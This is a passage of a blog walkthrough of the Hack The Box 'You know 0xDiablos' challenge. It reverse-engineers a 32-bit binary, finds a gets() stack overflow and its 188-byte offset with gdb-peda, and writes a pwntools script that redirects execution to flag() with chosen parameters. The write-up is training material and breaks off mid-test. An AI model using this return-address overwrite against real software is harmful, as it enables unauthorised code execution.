<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - You know 0xDiablos - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,you-know-0xdiablos,easy-box,reverse-engineering,static-analysis,ghidra,pwntools,buffer-overflow,smashing-the-stack,gdb-peda,challenge-box"><meta name=description content="The aim of this walkthrough is to provide help with the You know 0xDiablos challenge on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out with finishing the Beginner-Track challenges.
PREPARING-CHALLENGE-FILES After a quick look at the challenge description"><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/you-know-0xdiablos/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - You know 0xDiablos - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the You know 0xDiablos challenge on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out with finishing the Beginner-Track challenges.
PREPARING-CHALLENGE-FILES After a quick look at the challenge description"><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/you-know-0xdiablos/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-31T15:00:00+00:00"><meta property="article:modified_time" content="2023-05-31T15:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - You know 0xDiablos - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the You know 0xDiablos challenge on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out with finishing the Beginner-Track challenges.
PREPARING-CHALLENGE-FILES After a quick look at the challenge description"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - You know 0xDiablos - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/you-know-0xdiablos/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - You know 0xDiablos - Walkthrough","name":"HTB - You know 0xDiablos - Walkthrough","description":"The aim of this walkthrough is to provide help with the You know 0xDiablos challenge on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out with finishing the Beginner-Track challenges.\nPREPARING-CHALLENGE-FILES After a quick look at the challenge description","keywords":["htb","walkthrough","you-know-0xdiablos","easy-box","reverse-engineering","static-analysis","ghidra","pwntools","buffer-overflow","smashing-the-stack","gdb-peda","challenge-box"],"articleBody":"The aim of this walkthrough is to provide help with the You know 0xDiablos challenge on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out with finishing the Beginner-Track challenges.\nPREPARING-CHALLENGE-FILES After a quick look at the challenge description\nI missed my flag we proceed directly by downloading the challenge files.\nThere is only one compressed file called - You know 0xDiablos.zip - and we use the provided sha256 checksum to verify it’s integrity.\n# shell command echo -n \"307744fa0ae574756157a4607e307492141fdf1f000f6289eab4a8741729469c You know 0xDiablos.zip\" | sha256sum -c # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ ll total 4.0K -rw-r--r-- 1 htb-bluewalle htb-bluewalle 3.0K May 31 22:01 'You know 0xDiablos.zip' ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ echo -n \"307744fa0ae574756157a4607e307492141fdf1f000f6289eab4a8741729469c You know 0xDiablos.zip\" | sha256sum -c You know 0xDiablos.zip: OK ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ It looks like our file has not been tampered with so we continue by decompressing it.\n# shell command unzip -P hackthebox You\\ know\\ 0xDiablos.zip # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ unzip -P hackthebox You\\ know\\ 0xDiablos.zip Archive: You know 0xDiablos.zip skipping: vuln need PK compat. v5.1 (can do v4.6) ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ But when trying to decompress the archive, we get an error back. Looking for a fix online steers us towards the 7z file archiver. And since it’s already installed on the pwnbox, all that’s left for us now is to run it and extract the files.\n# shell command 7z x -phackthebox You\\ know\\ 0xDiablos.zip # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ 7z x -phackthebox You\\ know\\ 0xDiablos.zip 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_GB.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs DO-Regular (306F2),ASM,AES-NI) Scanning the drive for archives: 1 file, 3058 bytes (3 KiB) Extracting archive: You know 0xDiablos.zip -- Path = You know 0xDiablos.zip Type = zip Physical Size = 3058 Everything is Ok Size: 15656 Compressed: 3058 ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ ll total 20K -rw-r--r-- 1 htb-bluewalle htb-bluewalle 16K Nov 2 2019 vuln -rw-r--r-- 1 htb-bluewalle htb-bluewalle 3.0K May 31 22:01 'You know 0xDiablos.zip' ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ INFORMATION-GATHERING Looking at the result, the archive contains only one file:\nvuln Getting a better read on it\n# shell command file vuln # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ reveals it as a linux executable, so we give it execution rights.\n# shell command chmod a+x vuln # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ ll total 20K -rw-r--r-- 1 htb-bluewalle htb-bluewalle 16K Nov 2 2019 vuln -rw-r--r-- 1 htb-bluewalle htb-bluewalle 3.0K May 31 22:01 'You know 0xDiablos.zip' ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ chmod a+x vuln ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ ll total 20K -rwxr-xr-x 1 htb-bluewalle htb-bluewalle 16K Nov 2 2019 vuln -rw-r--r-- 1 htb-bluewalle htb-bluewalle 3.0K May 31 22:01 'You know 0xDiablos.zip' ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ Running a file name vuln sounds like a great idea, so why not do it? :)\n# shell command ./vuln # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ ./vuln You know who are 0xDiablos: test test ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ At our first run, seemingly all the program did was to echo our input back to us. Hopefully we get more luck with the printable characters from the binary.\n# shell command strings vuln \u003e vuln-strings.txt # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ strings vuln \u003e vuln-strings.txt ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ cat vuln-strings.txt tdX /lib/ld-linux.so.2 libc.so.6 _IO_stdin_used exit fopen puts printf fgets stdout setresgid getegid setvbuf __libc_start_main GLIBC_2.1 GLIBC_2.0 __gmon_start__ [^_] flag.txt Hurry up and try in on server side. You know who are 0xDiablos: ;*2$\" GCC: (Debian 8.3.0-19) 8.3.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.6887 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry vuln.c __FRAME_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini __x86.get_pc_thunk.bx printf@@GLIBC_2.0 __x86.get_pc_thunk.bp vuln fgets@@GLIBC_2.0 _edata getegid@@GLIBC_2.0 __data_start puts@@GLIBC_2.0 __gmon_start__ exit@@GLIBC_2.0 __dso_handle _IO_stdin_used __libc_start_main@@GLIBC_2.0 __libc_csu_init setvbuf@@GLIBC_2.0 fopen@@GLIBC_2.1 _dl_relocate_static_pie _fp_hw stdout@@GLIBC_2.0 __bss_start main __TMC_END__ setresgid@@GLIBC_2.0 flag .symtab .strtab .shstrtab .interp .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .got .got.plt .data .bss .comment ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ REVERSE-ENGINEERING–STATIC-ANALYSIS No flag there, so we move on and try disassembling it with ghidra. A bit of reverse engineering, static analysis in particular reveals the following:\nmain() calls vuln(), which does nothing except reading some data from a specific location and writing it back /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */ void vuln(void) { char local_bc [180]; gets(local_bc); puts(local_bc); return; } vuln() uses the gets function which is known to be susceptible to buffer overflows it is important to note, that it uses a 180 character long array to store the value it reads and echoes back the flag() function simply opens up flag.txt for reading, does some verification on the two parameters, and if they are correct, returns some value. This is how the decompiled source code for the flag() function looks like.\n/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */ void flag(int param_1,int param_2) { char local_50 [64]; FILE *local_10; local_10 = fopen(\"flag.txt\",\"r\"); if (local_10 != (FILE *)0x0) { fgets(local_50,0x40,local_10); if ((param_1 == -0x21524111) \u0026\u0026 (param_2 == -0x3f212ff3)) { printf(local_50); } return; } puts(\"Hurry up and try in on server side.\"); /* WARNING: Subroutine does not return */ exit(0); } The parameter check especially seems very important,\n... if ((param_1 == -0x21524111) \u0026\u0026 (param_2 == -0x3f212ff3)) ... therefore, we use the ghidra’s built-in functionality to convert the two hex values into character strings.\n... if ((param_1 == L'\\xdeadbeef') \u0026\u0026 (param_2 == L'\\xc0ded00d')) { ... It looks like we are already in the possession of all the missing pieces and it’s time to finally put them together. So in a nutshell, we have a buffer overflow and a function (flag()) which we want to run.\nBUFFER-OVERFLOW-VULNERABILITIES Therefore, our main idea here is to overwrite the return address stored on the stack for the vuln() function, so that when the program returns from vuln(), the execution continues with the flag() function.\nThere is a very nice blog post available explaining buffer overflows and stack canaries in more detail.\nBut for now, these are some important things to know about when working with functions calls:\nbefore calling a function, the next instruction is pushed to the stack once the function returns, the previously pushed instruction is popped from the stack regarding memory layout: stack grows downward parameters are put on stack before the function is called – in our case our stack frame could look like this when calling - flag (param_1, param_2) - Previous frame param_2 param_1 Return address Previous frame address Local variables Free memory This idea of overwriting the return address with a buffer overflow is called smashing the stack and it’s steps can briefly explained as:\nfunction contains a buffer variable allocated on stack – in our case, this is the local_bc variable in vuln() function copies user-controlled data to buffer without verifying that data size is smaller that buffer – vuln() does exactly that, the gets() function does no verification user data overwrites other variables on stack, up to return address saved in stack frame – we would overwrite the return address for vuln() with the starting address of the flag() function when procedure returns, program fetches return address from stack and copies it to EIP (instruction pointer) register – when the next instruction is executed, execution jumps to the flag() function program is now executing our code – in our case the flag() function So the stack frames for the vuln() function could look like this:\nPrevious frame - in main() Return address for vuln() – OVERWRITE Previous frame address – (old ebp) – OVERWRITE local variables – local_bc Free memory Let’s try and do a quick check by generating some garbage data that’s at least 180 character long. The local_bc variable in vuln() is a 180 char long buffer.\n# shell command python -c \"print('A'*180)\" | ./vuln # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ python -c \"print('A'*180)\" | ./vuln You know who are 0xDiablos: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ python -c \"print('A'*181)\" | ./vuln You know who are 0xDiablos: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ python -c \"print('A'*182)\" | ./vuln You know who are 0xDiablos: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ python -c \"print('A'*183)\" | ./vuln You know who are 0xDiablos: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ python -c \"print('A'*184)\" | ./vuln You know who are 0xDiablos: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Segmentation fault ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ python -c \"print('A'*185)\" | ./vuln You know who are 0xDiablos: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Segmentation fault ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ We get a segmentation fault back for 184 characters and above, which is usually the first indicator for a buffer overflow vulnerability. It means, that the we have successfully overwritten the return address with some garbage (A’s) and the program breaks down because that address is not valid.\nGDB-PEDA Our next course of action is to find out the flag() function’s memory address. But since working on buffer overflows is always easier when gdb is teamed up with peda, let’s install it first.\n# shell command git clone https://github.com/longld/peda.git ~/peda # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/Desktop] └──╼ [★]$ git clone https://github.com/longld/peda.git ~/peda Cloning into '/home/htb-bluewalle/peda'... remote: Enumerating objects: 382, done. remote: Counting objects: 100% (9/9), done. remote: Compressing objects: 100% (7/7), done. remote: Total 382 (delta 2), reused 8 (delta 2), pack-reused 373 Receiving objects: 100% (382/382), 290.84 KiB | 5.10 MiB/s, done. Resolving deltas: 100% (231/231), done. ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/Desktop] └──╼ [★]$ # shell command echo \"source ~/peda/peda.py\" \u003e\u003e ~/.gdbinit # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/Desktop] └──╼ [★]$ echo \"source ~/peda/peda.py\" \u003e\u003e ~/.gdbinit ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/Desktop] └──╼ [★]$ Once everything is set up, we run gdb on our executable.\n# shell command gdb vuln -q # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ gdb vuln -q Reading symbols from vuln... (No debugging symbols found in vuln) gdb-peda$ Once nice thing about peda that it already includes most of the tools you would need for payload generation. Let’s create a pattern/payload that definitely results in a segmentation fault.\n# gdb command pattern_create 200 payload-200.txt # terminal interaction gdb-peda$ pattern_create --help Generate a cyclic pattern Set \"pattern\" option for basic/extended pattern type Usage: pattern_create size [file] gdb-peda$ pattern_create 200 pattern-200.txt Writing pattern of 200 chars to filename \"pattern-200.txt\" gdb-peda$ Then we feed this payload to our executable when running it.\n# gdb command run \u003c pattern-200.txt # terminal interaction gdb-peda$ run \u003c pattern-200.txt Starting program: /home/htb-bluewalle/you-know-0xdiablos/vuln \u003c pattern-200.txt You know who are 0xDiablos: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0xc9 EBX: 0x76414158 ('XAAv') ECX: 0xffffffff EDX: 0xffffffff ESI: 0xf7faa000 --\u003e 0x1e3d6c EDI: 0xf7faa000 --\u003e 0x1e3d6c EBP: 0x41594141 ('AAYA') ESP: 0xffffd060 (\"ZAAxAAyA\") EIP: 0x41417741 ('AwAA') EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41417741 [------------------------------------stack-------------------------------------] 0000| 0xffffd060 (\"ZAAxAAyA\") 0004| 0xffffd064 (\"AAyA\") 0008| 0xffffd068 --\u003e 0xffffd100 --\u003e 0x1 0012| 0xffffd06c --\u003e 0x3eb 0016| 0xffffd070 --\u003e 0xffffd090 --\u003e 0x1 0020| 0xffffd074 --\u003e 0x0 0024| 0xffffd078 --\u003e 0x0 0028| 0xffffd07c --\u003e 0xf7de0e46 (\u003c__libc_start_main+262\u003e:\tadd esp,0x10) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x41417741 in ?? () gdb-peda$ Great, the program broke down because the EIP (extended instruction pointer) was overwritten with our garbage data. Currently it holds - (‘AwAA’) - which is simply junk data, but it should had the return address when returning from the vuln() to main().\nSo our goal now is controlling what exactly get’s written into this register. For that, we need to find the offset. Put simply, exactly just how many characters are before this - (‘AwAA’) - character string? Let’s check the offset for the EIP which contains the value of - 0x41417741 or AwAA’ -.\n# gdb command pattern_offset 0x41417741 # terminal interaction gdb-peda$ pattern_offset 0x41417741 1094809409 found at offset: 188 gdb-peda$ It looks like our offset is at 188. Now, to redirect the execution flow to the flag() function, we first need to know it’s starting address. This memory address - 0x080491e2 - is the first address we find when we disassemble the flag() function.\n# shell command disass flag # terminal interaction gdb-peda$ disass flag Dump of assembler code for function flag: 0x080491e2 \u003c+0\u003e:\tpush ebp 0x080491e3 \u003c+1\u003e:\tmov ebp,esp 0x080491e5 \u003c+3\u003e:\tpush ebx 0x080491e6 \u003c+4\u003e:\tsub esp,0x54 0x080491e9 \u003c+7\u003e:\tcall 0x8049120 \u003c__x86.get_pc_thunk.bx\u003e 0x080491ee \u003c+12\u003e:\tadd ebx,0x2e12 0x080491f4 \u003c+18\u003e:\tsub esp,0x8 0x080491f7 \u003c+21\u003e:\tlea eax,[ebx-0x1ff8] 0x080491fd \u003c+27\u003e:\tpush eax 0x080491fe \u003c+28\u003e:\tlea eax,[ebx-0x1ff6] 0x08049204 \u003c+34\u003e:\tpush eax 0x08049205 \u003c+35\u003e:\tcall 0x80490b0 0x0804920a \u003c+40\u003e:\tadd esp,0x10 0x0804920d \u003c+43\u003e:\tmov DWORD PTR [ebp-0xc],eax 0x08049210 \u003c+46\u003e:\tcmp DWORD PTR [ebp-0xc],0x0 0x08049214 \u003c+50\u003e:\tjne 0x8049232 0x08049216 \u003c+52\u003e:\tsub esp,0xc 0x08049219 \u003c+55\u003e:\tlea eax,[ebx-0x1fec] 0x0804921f \u003c+61\u003e:\tpush eax 0x08049220 \u003c+62\u003e:\tcall 0x8049070 0x08049225 \u003c+67\u003e:\tadd esp,0x10 0x08049228 \u003c+70\u003e:\tsub esp,0xc 0x0804922b \u003c+73\u003e:\tpush 0x0 0x0804922d \u003c+75\u003e:\tcall 0x8049080 0x08049232 \u003c+80\u003e:\tsub esp,0x4 0x08049235 \u003c+83\u003e:\tpush DWORD PTR [ebp-0xc] 0x08049238 \u003c+86\u003e:\tpush 0x40 0x0804923a \u003c+88\u003e:\tlea eax,[ebp-0x4c] 0x0804923d \u003c+91\u003e:\tpush eax 0x0804923e \u003c+92\u003e:\tcall 0x8049050 0x08049243 \u003c+97\u003e:\tadd esp,0x10 0x08049246 \u003c+100\u003e:\tcmp DWORD PTR [ebp+0x8],0xdeadbeef 0x0804924d \u003c+107\u003e:\tjne 0x8049269 0x0804924f \u003c+109\u003e:\tcmp DWORD PTR [ebp+0xc],0xc0ded00d 0x08049256 \u003c+116\u003e:\tjne 0x804926c 0x08049258 \u003c+118\u003e:\tsub esp,0xc 0x0804925b \u003c+121\u003e:\tlea eax,[ebp-0x4c] 0x0804925e \u003c+124\u003e:\tpush eax 0x0804925f \u003c+125\u003e:\tcall 0x8049030 0x08049264 \u003c+130\u003e:\tadd esp,0x10 0x08049267 \u003c+133\u003e:\tjmp 0x804926d 0x08049269 \u003c+135\u003e:\tnop 0x0804926a \u003c+136\u003e:\tjmp 0x804926d 0x0804926c \u003c+138\u003e:\tnop 0x0804926d \u003c+139\u003e:\tmov ebx,DWORD PTR [ebp-0x4] 0x08049270 \u003c+142\u003e:\tleave 0x08049271 \u003c+143\u003e:\tret End of assembler dump. gdb-peda$ GENERATING-PAYLOAD-WITH-PWNTOOLS It’s time to set out to create our payload. Using pwntools in a scenario like this could immensely speed up the whole payload generation process.\nThere are clear instructions on the website regarding the installation, so we just follow along.\napt-get update apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools Once installed, let’s create a scipt for payload generation.\n# shell command touch payload-get.py # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ touch payload-gen.py ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ codium payload-gen.py ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ Moreover, let’s use the checksec command to check the binary security settings.\n# shell command checksec vuln # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ checksec --help usage: pwn checksec [-h] [--file [elf ...]] [elf ...] Check binary security settings positional arguments: elf Files to check optional arguments: -h, --help show this help message and exit --file [elf ...] File to check (for compatibility with checksec.sh) ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ checksec vuln [*] '/home/htb-bluewalle/you-know-0xdiablos/vuln' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ There a couple of thing’s we need to keep in mind when we create the payload:\nour target is a 32-bit executable endianness: little-endian (LE) – from LSB executable ( - file vuln - output) As for the script, it’s just mostly just putting together all the little pieces we gathered up to now.\n# payload-gen.py from pwn import * offset = 188 flag_addr = 0x080491e2 eip_addr = p32(flag_addr) garbage = b'A'*offset previous_frame = b'A'*4 param_1 = p32(0xdeadbeef) param_2 = p32(0xc0ded00d) payload = garbage + eip_addr + previous_frame + param_1 + param_2 with open(\"payload.txt\", \"wb\") as file: file.write(payload) It’s one of the simplest ones, but even here, there are a few things to take a note of:\nthe return address which we overwrite, - eip_addr - is packaged as hex in a little endian format (default for p32()) the output file - payload.txt - is opened in a binary (b) mode for writing (w) we use c calling conventions to determine which parameter goes first and which second the data in previous_frame is arbitrary, it simply acts as a filler, but it has to be exactly 4 byte long the same packaging is used on the parameters as with the flag’s starting address It’s time for a test. Let’s set a breakpoint at the flag() 